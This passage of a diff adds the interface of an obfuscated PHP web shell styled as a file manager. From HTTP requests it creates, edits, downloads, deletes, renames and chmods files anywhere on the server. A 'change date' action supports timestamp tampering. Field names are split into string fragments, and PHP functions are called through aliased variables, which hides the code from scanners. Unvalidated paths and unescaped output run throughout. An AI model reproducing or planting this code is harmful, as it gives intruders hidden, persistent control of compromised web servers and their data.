+                  $buatf = $mkd($loke . "/" . $_POST['fo'.'lde'.'rba'.'ru']);
+                  $buatf ? alertSuccess("Folder <b>" . $hsc($_POST['fo'.'lde'.'rba'.'ru']) . "</b> created!") : alertError("Failed to create folder!");
+              }
+              echo '<div class="card max-w-md"><form method="post" class="flex gap-2">
+                      <input type="text" name="fo'.'lde'.'rba'.'ru" class="field flex-1" placeholder="folder-name">
+                      <input type="hidden" name="loknya" value="' . $_POST['loknya'] . '">
+                      <input type="hidden" name="pilih"  value="Fo'.'lde'.'r">
+                      <button type="submit" name="buatFo'.'lde'.'r" class="submit-btn"><i class="fa-solid fa-folder-plus mr-1"></i>Create</button>
+                    </form></div>';
+          }
+          echo '</div>';
+
+      } elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fi"."le") {
+          echo '<div class="flex-1 overflow-y-auto p-5">';
+          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-file-circle-plus"></i> Create File</h2>';
+          if ($isw("./") || $isr("./")) {
+              $loke = $_POST['lok'.'nya'];
+              if (isset($_POST['buatfi'.'le'])) {
+                  $buatf = $fpt($loke . "/" . $_POST['fi'.'lebaru'], "");
+                  $fxt($loke . "/" . $_POST['fi'.'lebaru']) ? alertSuccess("File <b>" . $hsc($_POST['fi'.'lebaru']) . "</b> created!") : alertError("Failed to create file!");
+              }
+              echo '<div class="card max-w-md"><form method="post" class="flex gap-2">
+                      <input type="text" name="fi'.'lebaru" class="field flex-1" placeholder="filename.txt">
+                      <input type="hidden" name="loknya" value="' . $_POST['lok'.'nya'] . '">
+                      <input type="hidden" name="pilih"  value="fi'.'le">
+                      <button type="submit" name="buatfi'.'le" class="submit-btn"><i class="fa-solid fa-file-circle-plus mr-1"></i>Create</button>
+                    </form></div>';
+          }
+          echo '</div>';
+
+      } else {
+
+      /* ================================================================
+       *  FILE EXPLORER TABLE (default view)
+       * ================================================================ */
+      ?>
+      <div class="flex-1 overflow-y-auto">
+        <table id="file-table" class="w-full border-collapse">
+          <thead class="sticky top-0 bg-surface z-10">
+            <tr>
+              <th class="text-left">Name</th>
+              <th class="text-center">Size</th>
+              <th class="text-center">Modified</th>
+              <th class="text-center">Owner / Group</th>
+              <th class="text-center">Perms</th>
+              <th class="text-center">Actions</th>
+            </tr>
+          </thead>
+          <tbody>
+
+            <!-- Parent dir row -->
+            <?php
+            $euybrekw = $srl($bsn($lokasi), "", $lokasi);
+            $euybrekw = $srl("//", "/", $euybrekw);
+            $permVal  = statusnya($euybrekw);
+            $permCls  = $isw($euybrekw) ? 'perm-write' : (!$isr($euybrekw) ? 'perm-noread' : 'perm-normal');
+            ?>
+            <tr class="file-row">
+              <td>
+                <div class="filename-cell">
+                  <i class="fa-solid fa-folder-open ico-back"></i>
+                  <a href="?loknya=<?php echo $euybrekw; ?>">..</a>
+                  <span class="text-dim text-xs">(parent)</span>
+                </div>
+              </td>
+              <td class="text-center text-dim text-xs">—</td>
+              <td class="text-center text-dim text-xs"><?php echo fdt($euybrekw); ?></td>
+              <td class="text-center text-dim text-xs"><?php echo gor($euybrekw); ?> / <?php echo ggr($euybrekw); ?></td>
+              <td class="text-center"><span class="<?php echo $permCls; ?> text-xs font-mono"><?php echo $permVal; ?></span></td>
+              <td class="text-center">
+                <div class="flex items-center justify-center gap-1">
+                  <form method="POST" action="?pilihan&loknya=<?php echo $lokasi; ?>">
+                    <input type="hidden" name="type"   value="dir">
+                    <input type="hidden" name="loknya" value="<?php echo $lokasi; ?>/">
+                    <button type="submit" name="pilih" value="folder" class="icon-btn safe" title="New Folder">
+                      <i class="fa-solid fa-folder-plus fa-xs"></i>
+                    </button>
+                    <button type="submit" name="pilih" value="file" class="icon-btn safe" title="New File">
+                      <i class="fa-solid fa-file-circle-plus fa-xs"></i>
+                    </button>
+                  </form>
+                </div>
+              </td>
+            </tr>
+
+            <!-- Directories -->
+            <?php foreach ($lokasinya as $ppkcina):
+                $euybre = $lokasi . "/" . $ppkcina;
+                $euybre = $srl("//", "/", $euybre);
+                if (!$idi($euybre) || $ppkcina == '.' || $ppkcina == '..') continue;
+                $permVal = statusnya($euybre);
+                $permCls = $isw($euybre) ? 'perm-write' : (!$isr($euybre) ? 'perm-noread' : 'perm-normal');
+            ?>
+            <tr class="file-row">
+              <td>
+                <div class="filename-cell">
+                  <i class="fa-solid fa-folder ico-folder"></i>
+                  <a href="?loknya=<?php echo $euybre; ?>"><?php echo $ppkcina; ?></a>
+                </div>
+              </td>
+              <td class="text-center text-dim text-xs">—</td>
+              <td class="text-center text-dim text-xs"><?php echo fdt($euybre); ?></td>
+              <td class="text-center text-dim text-xs"><?php echo gor($euybre); ?> / <?php echo ggr($euybre); ?></td>
+              <td class="text-center"><span class="<?php echo $permCls; ?> text-xs font-mono"><?php echo $permVal; ?></span></td>
+              <td class="text-center">
+                <div class="flex items-center justify-center gap-1">
+                  <form method="POST" action="?pilihan&loknya=<?php echo $lokasi; ?>">
+                    <input type="hidden" name="type"   value="dir">
+                    <input type="hidden" name="name"   value="<?php echo $ppkcina; ?>">
+                    <input type="hidden" name="loknya" value="<?php echo $lokasi . "/" . $ppkcina; ?>">
+                    <button type="submit" name="pilih" value="ubahnama"    class="icon-btn" title="Rename"><i class="fa-solid fa-pen fa-xs"></i></button>
+                    <button type="submit" name="pilih" value="ubahtanggal" class="icon-btn" title="Change Date"><i class="fa-solid fa-calendar-days fa-xs"></i></button>
+                    <button type="submit" name="pilih" value="ubahmod"     class="icon-btn" title="Permissions"><i class="fa-solid fa-key fa-xs"></i></button>
+                    <button type="submit" name="pilih" value="hapus"       class="icon-btn danger" title="Delete"><i class="fa-solid fa-trash fa-xs"></i></button>
+                  </form>
+                </div>
+              </td>
+            </tr>
+            <?php endforeach; ?>
+
+            <!-- Files separator -->
+            <tr class="dir-divider">
+              <td colspan="6"><i class="fa-solid fa-file fa-xs mr-2"></i>Files</td>
+            </tr>
+
+            <!-- Files -->
+            <?php
+            $skd = "10"."24";
+            foreach ($lokasinya as $mekicina):
+                $euybray = $lokasi . "/" . $mekicina;
+                if (!$ifi("$lokasi/$mekicina")) continue;
+                $size = $fsz("$lokasi/$mekicina") / $skd;
+                $size = $rd($size, 3);
+                $size = ($size >= $skd) ? $rd($size / $skd, 2) . ' MB' : $size . ' KB';
+                $permVal = statusnya($euybray);
+                $permCls = $isw($euybray) ? 'perm-write' : (!$isr($euybray) ? 'perm-noread' : 'perm-normal');
+            ?>
+            <tr class="file-row">
+              <td>
+                <div class="filename-cell">
+                  <?php echo cfn($euybray); ?>
+                  <a href="?lokasie=<?php echo "$lokasi/$mekicina"; ?>&loknya=<?php echo $lokasi; ?>">
+                    <?php echo $mekicina; ?>
+                  </a>
+                </div>
+              </td>
+              <td class="text-center text-dim text-xs"><?php echo $size; ?></td>
+              <td class="text-center text-dim text-xs"><?php echo fdt($euybray); ?></td>
+              <td class="text-center text-dim text-xs"><?php echo gor($euybray); ?> / <?php echo ggr($euybray); ?></td>
+              <td class="text-center"><span class="<?php echo $permCls; ?> text-xs font-mono"><?php echo $permVal; ?></span></td>
+              <td class="text-center">
+                <div class="flex items-center justify-center gap-1">
+                  <form method="post" action="?pilihan&loknya=<?php echo $lokasi; ?>">
+                    <input type="hidden" name="type"   value="file">
+                    <input type="hidden" name="name"   value="<?php echo $mekicina; ?>">
+                    <input type="hidden" name="loknya" value="<?php echo "$lokasi/$mekicina"; ?>">
+                    <button type="submit" name="pilih" value="edit"       class="icon-btn safe"   title="Edit"><i class="fa-solid fa-pen-to-square fa-xs"></i></button>
+                    <button type="submit" name="pilih" value="ubahnama"   class="icon-btn"        title="Rename"><i class="fa-solid fa-pen fa-xs"></i></button>
+                    <button type="submit" name="pilih" value="ubahtanggal"class="icon-btn"        title="Change Date"><i class="fa-solid fa-calendar-days fa-xs"></i></button>
+                    <button type="submit" name="pilih" value="ubahmod"    class="icon-btn"        title="Permissions"><i class="fa-solid fa-key fa-xs"></i></button>
+                    <button type="submit" name="pilih" value="dunlut"     class="icon-btn safe"   title="Download"><i class="fa-solid fa-download fa-xs"></i></button>
+                    <button type="submit" name="pilih" value="hapus"      class="icon-btn danger" title="Delete"><i class="fa-solid fa-trash fa-xs"></i></button>
+                  </form> 
+                </div>
+              </td>
+            </tr>
+            <?php endforeach; ?>
+
+          </tbody>
+        </table>
+      </div>
+      <?php } /* end default view */ ?>
+
+    </main>
+  </div><!-- end main area -->
+</div><!-- end flex wrapper -->
+
+<script>
+function toggleTheme() {
+    var html  = document.documentElement;
+    var icon  = document.getElementById('theme-icon');
+    var label = document.getElementById('theme-label');
+    var isLight = html.classList.toggle('light');
+
+    if (isLight) {
+        icon.className  = 'fa-solid fa-sun';
+        icon.style.color = 'var(--c-accent)';
+        label.textContent = 'LIGHT';
+        localStorage.setItem('bl-theme', 'light');
+    } else {
+        icon.className  = 'fa-solid fa-moon';
+        icon.style.color = 'var(--c-accent)';
+        label.textContent = 'DARK';
+        localStorage.setItem('bl-theme', 'dark');
+    }
+}
+
+// Sync button state on load
+(function() {
+    var t = localStorage.getItem('bl-theme') || 'dark';
+    var icon  = document.getElementById('theme-icon');
+    var label = document.getElementById('theme-label');
+    if (!icon || !label) return;
+    if (t === 'light') {
+        icon.className = 'fa-solid fa-sun';
+        label.textContent = 'LIGHT';
+    } else {
+        icon.className = 'fa-solid fa-moon';
+        label.textContent = 'DARK';
+    }
+})();
+</script>
 </body>
 </html>
